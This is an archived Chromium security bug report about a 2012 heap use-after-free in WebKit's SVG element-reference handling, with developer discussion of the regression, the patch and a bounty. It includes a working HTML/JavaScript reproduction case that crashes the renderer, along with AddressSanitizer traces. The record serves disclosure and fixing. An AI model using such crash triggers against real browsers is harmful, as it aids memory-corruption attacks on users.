# Heap-use-after-free in WebCore::SVGDocumentExtensions::removeAllElementReferencesForTarget

| Field | Value |
|-------|-------|
| **Issue ID** | [40058999](https://issues.chromium.org/issues/40058999) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>SVG |
| **Reporter** | mi...@gmail.com |
| **Assignee** | pd...@chromium.org |
| **Created** | 2012-05-30 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free in WebCore::SVGDocumentExtensions::removeAllElementReferencesForTarget

**VERSION**  

Chrome Version: dev

Chromium 21.0.1157.0 (Developer Build 139531)  

OS Linux  

WebKit 537.1 (@118843)

Operating System: 64bit precise

**REPRODUCTION CASE**

<html>
<head>
<style>
</style>
<script>
onload = function() {
el0=document.createElementNS('http://www.w3.org/2000/svg', 'svg')
el0.setAttribute('id','el0')
document.body.appendChild(el0)
```
    document.body.appendChild(document.createTextNode('A'))  

    el1=document.createElementNS('http://www.w3.org/2000/svg', 'svg')  
    el1.setAttribute('id','el1')  
    el1.appendChild(document.createTextNode('A'))  
    document.body.appendChild(el1)  

    document.body.appendChild(document.createTextNode('A'))  

    el2=document.createElementNS('http://www.w3.org/2000/svg', 'image')  
    el2.setAttribute('id','el2')  
    el0.appendChild(el2)  

    el3=document.createElementNS('http://www.w3.org/2000/svg', 'textPath')  
    el3.setAttributeNS('http://www.w3.org/1999/xlink', 'xlink:href', '#el1')  
    el2.appendChild(el3)  

    el4=document.createElementNS('http://www.w3.org/2000/svg', 'use')  
    el4.setAttributeNS('http://www.w3.org/1999/xlink', 'xlink:href', '#el2')  
    el0.appendChild(el4)  

    el2.setAttributeNS('http://www.w3.org/1999/xlink', 'xlink:href', '#el0')  
    document.designMode='on'  
    window.getSelection().setBaseAndExtent(el1, 0, el1, 0)  
    document.execCommand('ForwardDelete')  
    setTimeout("location.reload()", 10)  
  }  
</script>  

```
 </head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab + asan  

Crash State:

==9219== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffed156480 at pc 0x55555bb9c7b9 bp 0x7fffffff6230 sp 0x7fffffff6228  

READ of size 8 at 0x7fffed156480 thread T0  

#0 0x55555bb9c7b9 in WebCore::SVGDocumentExtensions::removeAllElementReferencesForTarget(WebCore::SVGElement\*) ???:0  

#1 0x55555bba923e in WebCore::SVGElement::removedFrom(WebCore::ContainerNode\*) ???:0  

#2 0x55555bd42d90 in WebCore::SVGStyledElement::removedFrom(WebCore::ContainerNode\*) ???:0

0x7fffed156480 is located 0 bytes inside of 392-byte region [0x7fffed156480,0x7fffed156608)  

freed by thread T0 here:  

#0 0x55555e5cbd52 in operator delete(void\*) ??:0  

#1 0x55555bbb3728 in WebCore::SVGElementInstance::detach() ???:0  

#2 0x55555bbb3246 in WebCore::SVGElementInstance::~SVGElementInstance() ???:0  

#3 0x55555bbb319e in WebCore::SVGElementInstance::~SVGElementInstance() ???:0

## Attachments

- [0392.txt](attachments/0392.txt) (text/x-c; charset=us-ascii, 12.4 KB)
- [0392.html](attachments/0392.html) (text/html; charset=us-ascii, 1.4 KB)

## Timeline

### in...@chromium.org (2012-05-30)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-30)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=53433906

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f9edf9b3c80
Crash State:
  - crash stack -
  WebCore::SVGDocumentExtensions::removeAllElementReferencesForTarget
  WebCore::SVGElement::removedFrom
  - free stack -
  WebCore::SVGElementInstance::detach
  WebCore::SVGElementInstance::~SVGElementInstance
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=139300:139395

Minimized Testcase (1.10 Kb): https://cluster-fuzz.appspot.com/download/AMIfv968MsHol1ezUseel0zNe5P-oaASUNtgTePunUuguxHTOK7rPf9Ru4zchHA_0hpVVeJce2QxCiJW1IxrXN6BK8BCTlov6UkFNI1qHHdwJnyzZrlarRIN0PkPXD1t_VQjgZNyu9r1tn7nrmRmBSIbVYU2gxQj5s66LkRBOnQzYdrOG8X1B9c

### in...@chromium.org (2012-05-30)

SVG team, please help to find the regresse

### pd...@chromium.org (2012-06-01)

https://bugs.webkit.org/show_bug.cgi?id=15799 looks like the most probable regresse

### in...@chromium.org (2012-06-01)

Thanks Philip. Can you please help to upstream this and poke Rob to fix the regression :)

### pd...@chromium.org (2012-06-01)

Upstream: https://bugs.webkit.org/show_bug.cgi?id=88144

### pa...@chromium.org (2012-06-05)

According to https://bugs.webkit.org/show_bug.cgi?id=15799, which is the bug pdr believes is the root cause, the bug should be fixed. We now have that fix in our tree; I can't reproduce the crash on Mac dev or canary, but that doesn't necessarily mean it's really fixed. ClusterFuzz hasn't told us that we are happy yet, so maybe the bug persists?

I hate to be presumptuous, but I also hate to have a release-blocker with no owner, so I'm giving this to pdr. Maybe it'll turn out that you don't need to do anything. And if you're not the right person to take it, can you let us know who is best? Thanks! And, sorry. :)

### pd...@chromium.org (2012-06-05)

This bug is still present, you need to use an ASAN build to hit it though. Re-pinging rbuis to get this fixed, or I'll pick it up myself if he doesn't respond.

### pd...@chromium.org (2012-06-06)

I'm now on this bug.

### pd...@chromium.org (2012-06-12)

Small update: I haven't forgotten about this (it's my top issue).

### pd...@chromium.org (2012-06-14)

Patch up!

### pd...@chromium.org (2012-06-14)

@Abhishek, to get this in it needs to be in before tomorrow. Can you review this? Pinging Rob on IRC is not working and Niko is offline.

### in...@chromium.org (2012-06-18)

http://trac.webkit.org/changeset/120559. Philip, does this need merging for m20 ? that function looked old, it might be that some new code just helped to trigger this.

### pd...@chromium.org (2012-06-18)

I think this does need merging. http://trac.webkit.org/changeset/118609 introduced the textPath regression, but http://trac.webkit.org/changeset/107067 is the real culprit which introduced this new resource handling model. There is almost certainly the same security bug in feImageElement.

### in...@chromium.org (2012-06-18)

Perfect.

### sc...@gmail.com (2012-06-19)

M20: http://trac.webkit.org/changeset/120762

### sc...@gmail.com (2012-06-19)

[Empty comment from Monorail migration]

### pd...@chromium.org (2012-06-19)

Just FYI: This bug also exposed some content model issues in SVG that schenney and I are working on in free time. For instance, you shouldn't be able to have:
<image>
  <textPath/>
</image>
to begin with.

### pd...@chromium.org (2012-06-19)

(https://bugs.webkit.org/show_bug.cgi?id=89523).

### sc...@gmail.com (2012-06-22)

$1000

### sc...@gmail.com (2012-06-25)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-07-09)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### la...@google.com (2013-01-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/130356?no_tracker_redirect=1

[Multiple monorail components: Blink, Blink>SVG]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40058999)*
